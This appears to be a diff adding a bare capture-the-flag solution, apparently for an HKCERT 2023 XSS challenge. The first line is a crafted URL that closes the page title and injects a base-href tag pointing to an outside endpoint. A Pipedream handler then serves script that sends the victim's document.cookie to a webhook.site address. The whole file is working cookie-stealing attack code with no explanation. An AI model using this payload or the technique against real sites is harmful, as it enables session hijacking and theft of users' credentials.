@@ -1,0 +1,16 @@
+http://fetusxss-b9odzq.hkcert23.pwnable.hk:28133/?title=%3C/title%3E%3Cbase%20href=%22http://eooqbkgug4ifs62.m.pipedream.net%22%3E
+
+
+
+export default defineComponent({
+  async run({ steps, $ }) {
+    const headers = {"Content-Type": "text/javascript"}
+    const body = `location="https://webhook.site/b8c29f62-003a-4fbf-a6fe-da70842251e5/?"+document.cookie`
+
+    await $.respond({
+      status: 200,
+      headers,
+      body,
+    })
+  },
+})
